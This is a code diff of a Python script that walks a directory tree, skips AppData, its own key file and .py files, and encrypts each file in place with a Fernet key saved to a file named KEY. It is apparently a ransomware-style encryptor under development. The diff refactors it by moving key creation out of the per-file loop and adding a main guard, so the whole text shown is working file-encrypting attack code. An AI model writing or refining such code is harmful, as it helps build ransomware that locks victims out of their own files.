@@ -42,6 +42,9 @@ print(current_user)
 #ENCRYPTION PROCCESS
 
 def encrypt_path():
+    with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
+                    file_key.write(key)
+                    loaded_key = Fernet(key)
     for root, dirs, files in os.walk(test_path):
         
         if 'AppData' in dirs:
@@ -51,9 +54,7 @@ def encrypt_path():
             if x == "KEY" or x.endswith(".py"):
                 continue
             try : 
-                with open("KEY", "wb") as file_key :#create binary key to encrypt (and decrypt)
-                    file_key.write(key)
-                    loaded_key = Fernet(key)
+                
                 
                 with open(full_path, "rb") as f:
                     original_data = f.read()
@@ -72,4 +73,5 @@ def encrypt_path():
             except Exception as e:
                 print(f"Error in {full_path}: {e}")
 
-encrypt_path()
+if __name__ == "__main__":
+    encrypt_path()
